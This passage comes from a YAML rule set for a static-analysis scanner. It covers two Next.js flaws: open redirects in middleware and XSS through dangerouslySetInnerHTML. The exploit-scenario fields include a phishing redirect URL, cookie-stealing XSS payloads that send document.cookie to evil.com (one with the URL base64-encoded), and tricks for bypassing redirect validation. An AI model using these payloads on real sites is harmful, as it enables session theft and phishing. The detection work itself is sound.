  - rule_id: "FW-NEXT-003"
    title: "Unsafe Redirect in Next.js Middleware"
    description: >
      Detects Next.js middleware that performs redirects based on user-controlled
      input without proper validation. Attackers can manipulate query parameters,
      headers, or cookies to redirect users to malicious external sites, enabling
      phishing, credential theft, and OAuth token interception. Open redirects in
      middleware affect all routes matched by the middleware matcher.
    language: javascript
    category: framework_misuse
    severity: High
    confidence: 0.86
    cwe: CWE-601
    owasp: "A01:2021-Broken Access Control"
    tags:
      - nextjs
      - middleware
      - open-redirect
      - phishing
      - redirect-validation
    detection_layer: 4
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*req\.\w+'
        description: "Next.js redirect using user-controlled request data"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*request\.nextUrl\.searchParams\.get'
        description: "Redirect using URL search parameter"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*\w+\s*\)[\s\S]*?req\.url'
        description: "Redirect with URL derived from request"
      - type: regex
        pattern: 'redirect\s*\(\s*request\.nextUrl\.searchParams\.get\s*\(\s*["\x27](redirect|url|next|return|goto|to|dest|destination|callback)["\x27]\s*\)'
        description: "Redirect using common redirect parameter names"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*`[^`]*\$\{[^}]*req'
        description: "Template literal redirect with request interpolation"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*`[^`]*\$\{[^}]*searchParams'
        description: "Template URL redirect from search params"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*req\.headers\.get\s*\(\s*["\x27]referer["\x27]'
        description: "Redirect based on referer header"
      - type: regex
        pattern: 'NextResponse\.redirect\s*\(\s*cookies\s*\(\s*\)\.get\s*\([^)]+\)\.value'
        description: "Redirect based on cookie value"
    anti_patterns:
      - 'new\s+URL\s*\(\s*\w+\s*,\s*req\.nextUrl\.origin\s*\)'
      - 'url\.hostname\s*===\s*["\x27]'
      - 'url\.origin\s*===\s*["\x27]'
      - 'allowedRedirects\s*\.\s*includes\s*\('
      - 'safeRedirect\s*\('
      - 'isInternalUrl\s*\('
      - 'url\.startsWith\s*\(\s*["\x27]\/(?!\/)'
      - 'isSafeRedirect\s*\('
      - 'validateRedirectUrl\s*\('
      - 'redirectAllowlist'
      - 'url\.host\s*===\s*request\.nextUrl\.host'
      - 'new\s+URL\s*\(\s*["\x27]\/\w+'
      - 'pathname\.startsWith\s*\(\s*["\x27]\/\w+'
      - 'redirect_whitelist'
      - 'ALLOWED_REDIRECT_HOSTS'
    bypass_variants:
      - description: "URL validation bypassed with protocol-relative URL"
        pattern: 'startsWith\s*\(\s*["\x27]\/["\x27]\s*\)(?![\s\S]*startsWith\s*\(\s*["\x27]\/\/["\x27])'
      - description: "Host validation bypassed with subdomain manipulation"
        pattern: '\.endsWith\s*\(\s*["\x27]\.example\.com["\x27]\s*\)'
      - description: "URL parser confusion using backslash"
        pattern: 'new\s+URL\s*\(\s*\w+\s*\)[\s\S]*?(?!.*protocol\s*===)'
    evasion_indicators:
      - "Using URL encoding to bypass redirect validation"
      - "Using protocol-relative URLs (//evil.com) to bypass path-only checks"
      - "Using backslash (\\/evil.com) to exploit URL parser inconsistencies"
    encoding_variants:
      - type: "url_encoded"
        pattern: '%2f%2f\w+\.com'
      - type: "unicode"
        pattern: '\\u002f\\u002f'
    multi_function_chain_patterns:
      - "middleware -> searchParams.get('redirect') -> NextResponse.redirect(url) -> open redirect"
      - "middleware -> cookie.get('return_url') -> NextResponse.redirect(url) -> phishing"
      - "middleware -> headers.get('referer') -> NextResponse.redirect(url) -> session theft"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Open redirect enables phishing and OAuth token theft via redirect_uri manipulation"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "URL search parameters (redirect, url, next)"
        sink: "NextResponse.redirect()"
        through: "Middleware URL construction"
    impact: |
      Open redirect vulnerabilities in Next.js middleware affect all routes
      covered by the middleware matcher. Attackers can construct URLs that
      appear to point to the legitimate application but redirect to malicious
      sites. This enables convincing phishing attacks, OAuth token theft via
      redirect_uri manipulation, and bypass of security controls that trust
      the application domain.
    remediation: |
      Validate redirect URLs in middleware:

      ```javascript
      import { NextResponse } from 'next/server';

      const ALLOWED_HOSTS = ['example.com', 'app.example.com'];

      export function middleware(request) {
        const redirectUrl = request.nextUrl.searchParams.get('redirect');

        if (redirectUrl) {
          try {
            const url = new URL(redirectUrl, request.nextUrl.origin);
            // Only allow same-origin or whitelisted redirects
            if (!ALLOWED_HOSTS.includes(url.hostname)) {
              return NextResponse.redirect(new URL('/', request.url));
            }
            // Prevent protocol-relative URL bypass
            if (redirectUrl.startsWith('//')) {
              return NextResponse.redirect(new URL('/', request.url));
            }
            return NextResponse.redirect(url);
          } catch {
            return NextResponse.redirect(new URL('/', request.url));
          }
        }
      }
      ```
    references:
      - "https://nextjs.org/docs/app/building-your-application/routing/middleware"
      - "https://cwe.mitre.org/data/definitions/601.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
      - "https://portswigger.net/kb/issues/00500100_open-redirection-reflected"
    context_awareness:
      surrounding_context_patterns:
        - 'middleware\.ts'
        - 'middleware\.js'
        - 'NextResponse\.redirect'
        - 'export\s+function\s+middleware'
      taint_source_indicators:
        - 'request\.nextUrl\.searchParams'
        - 'req\.headers\.get\s*\('
        - 'req\.cookies\.get\s*\('
        - 'req\.url'
      taint_sink_indicators:
        - 'NextResponse\.redirect\s*\('
        - 'new\s+URL\s*\('
      sanitization_patterns:
        - 'url\.hostname\s*===\s*["\x27]'
        - 'ALLOWED_HOSTS\.includes\s*\('
        - 'isInternalUrl\s*\('
    severity_scoring:
      severity_weight: 7
      risk_score_formula_hint: "severity_weight * confidence * (auth_flow ? 1.5 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Next.js middleware reads a 'redirect' parameter and uses it to
        redirect after authentication. An attacker crafts a URL:
        https://app.example.com/login?redirect=https://evil.com/steal-creds
        The victim clicks the link, logs in legitimately, and is redirected
        to the attacker's site which mimics the real application and prompts
        for additional information or captures the session.
      example_payload: "https://target.com/login?redirect=https%3A%2F%2Fevil.com%2Fphish"
      attacker_objective: "Redirect authenticated users to attacker-controlled phishing site"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "framework-aware"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "FW-NEXT-001"
        - "FW-NEXT-002"
        - "FW-NEXT-004"

  - rule_id: "FW-NEXT-004"
    title: "SSR Injection via dangerouslySetInnerHTML in Next.js"
    description: >
      Detects Next.js components that use dangerouslySetInnerHTML with data
      sourced from user input, database queries, or external APIs without
      proper sanitization. In a server-side rendering context, this can lead
      to stored XSS, reflected XSS, and in some cases server-side template
      injection. Because Next.js renders on the server first, injected scripts
      are included in the initial HTML response.
    language: javascript
    category: framework_misuse
    severity: High
    confidence: 0.92
    cwe: CWE-79
    owasp: "A03:2021-Injection"
    tags:
      - nextjs
      - xss
      - ssr
      - dangerouslySetInnerHTML
      - injection
      - react
    detection_layer: 4
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*\w+\s*\}'
        description: "dangerouslySetInnerHTML with variable content"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*props\.\w+'
        description: "dangerouslySetInnerHTML with prop data"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*`[^`]*\$\{'
        description: "dangerouslySetInnerHTML with template literal interpolation"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*data\??\.\w+'
        description: "dangerouslySetInnerHTML with fetched data"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*\w+\s*\+\s*'
        description: "dangerouslySetInnerHTML with string concatenation"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*params\.\w+'
        description: "dangerouslySetInnerHTML with route params"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*searchParams\.\w+'
        description: "dangerouslySetInnerHTML with search params"
      - type: regex
        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*createMarkup\s*\(\s*\w+'
        description: "dangerouslySetInnerHTML via createMarkup helper with dynamic data"
    anti_patterns:
      - 'DOMPurify\.sanitize\s*\('
      - 'sanitizeHtml\s*\('
      - 'xss\s*\('
      - 'sanitize\s*\(\s*\w+\s*\)'
      - 'purify\.sanitize\s*\('
      - 'isomorphic-dompurify'
      - 'he\.encode\s*\('
      - 'escape\s*\(\s*\w+\s*\)'
      - 'escapeHtml\s*\('
      - 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*["\x27]<[^"]+>["\x27]'
      - 'sanitizer\.sanitize\s*\('
      - 'bleach\.clean\s*\('
      - 'marked\s*\(\s*\w+\s*,\s*\{\s*sanitize\s*:\s*true'
      - 'rehype-sanitize'
      - 'xss-filters'
    bypass_variants:
      - description: "Sanitization of parent field but not nested field"
        pattern: 'sanitize\s*\(\s*\w+\.\w+\s*\)[\s\S]*dangerouslySetInnerHTML[\s\S]*__html\s*:\s*\w+\.\w+\.\w+'
      - description: "Custom sanitizer that does not handle all XSS vectors"
        pattern: 'replace\s*\(\s*/<script>/gi\s*,\s*["\x27]["\x27]\s*\)[\s\S]*dangerouslySetInnerHTML'
      - description: "Server component rendering unsanitized markdown to HTML"
        pattern: 'marked\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML[\s\S]*__html'
    evasion_indicators:
      - "Using base64 encoded HTML in dangerouslySetInnerHTML"
      - "Multi-step data flow from API response to dangerouslySetInnerHTML"
      - "Server component fetching external content and rendering without sanitization"
    encoding_variants:
      - type: "base64_html"
        pattern: 'atob\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML'
      - type: "unicode_escape"
        pattern: 'unescape\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML'
    multi_function_chain_patterns:
      - "fetch(api) -> response.json() -> data.content -> dangerouslySetInnerHTML [no sanitize]"
      - "getServerSideProps -> db.query() -> props.htmlContent -> dangerouslySetInnerHTML [no sanitize]"
      - "useSearchParams() -> param.get('content') -> dangerouslySetInnerHTML [no sanitize]"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "XSS enables session hijacking, data theft, and full account takeover"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "User input (search params, form data, URL fragments)"
        sink: "dangerouslySetInnerHTML __html property"
        through: "Props, state, or fetched data"
      - source: "Database content (user-generated HTML)"
        sink: "dangerouslySetInnerHTML __html property"
        through: "getServerSideProps or Server Component data fetching"
    impact: |
      Using dangerouslySetInnerHTML with unsanitized data in Next.js enables
      cross-site scripting (XSS) attacks. Since Next.js performs server-side
      rendering, the malicious script is embedded in the initial HTML response,
      making it effective even against users with JavaScript-heavy client-side
      protections. Attackers can steal session cookies, redirect users,
      modify page content, and perform actions on behalf of the victim.
    remediation: |
      Always sanitize HTML before using dangerouslySetInnerHTML:

      ```javascript
      import DOMPurify from 'isomorphic-dompurify';

      function SafeHtmlContent({ htmlContent }) {
        const sanitizedHtml = DOMPurify.sanitize(htmlContent, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
          ALLOWED_ATTR: ['href', 'target', 'rel'],
        });

        return (
          <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
        );
      }

      // Or better yet, use a safe Markdown renderer:
      import ReactMarkdown from 'react-markdown';
      import rehypeSanitize from 'rehype-sanitize';

      function SafeContent({ content }) {
        return <ReactMarkdown rehypePlugins={[rehypeSanitize]}>{content}</ReactMarkdown>;
      }
      ```
    references:
      - "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"
      - "https://cwe.mitre.org/data/definitions/79.html"
      - "https://owasp.org/Top10/A03_2021-Injection/"
      - "https://github.com/cure53/DOMPurify"
    context_awareness:
      surrounding_context_patterns:
        - 'dangerouslySetInnerHTML'
        - '__html\s*:'
        - 'createMarkup\s*\('
        - 'innerHTML'
      taint_source_indicators:
        - 'props\.\w+'
        - 'searchParams'
        - 'params\.\w+'
        - 'data\.\w+'
        - 'fetch\s*\('
      taint_sink_indicators:
        - '__html\s*:\s*\w+'
        - 'dangerouslySetInnerHTML'
      sanitization_patterns:
        - 'DOMPurify\.sanitize\s*\('
        - 'sanitizeHtml\s*\('
        - 'xss\s*\('
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (ssr_context ? 1.5 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Next.js blog application renders user-submitted article content
        using dangerouslySetInnerHTML without sanitization. An attacker
        creates an article containing:
        <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
        When any user views the article, the malicious script executes,
        sending their session cookie to the attacker. Since Next.js SSR
        embeds this in the initial HTML, it executes before any client-side
        protection can intervene.
      example_payload: '<img src=x onerror="fetch(atob(aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==)+\"?c=\"+document.cookie)">'
      attacker_objective: "Execute arbitrary JavaScript in victims' browsers to steal sessions and data"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "framework-aware"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "FW-NEXT-001"
        - "FW-NEXT-002"
        - "FW-NEXT-003"
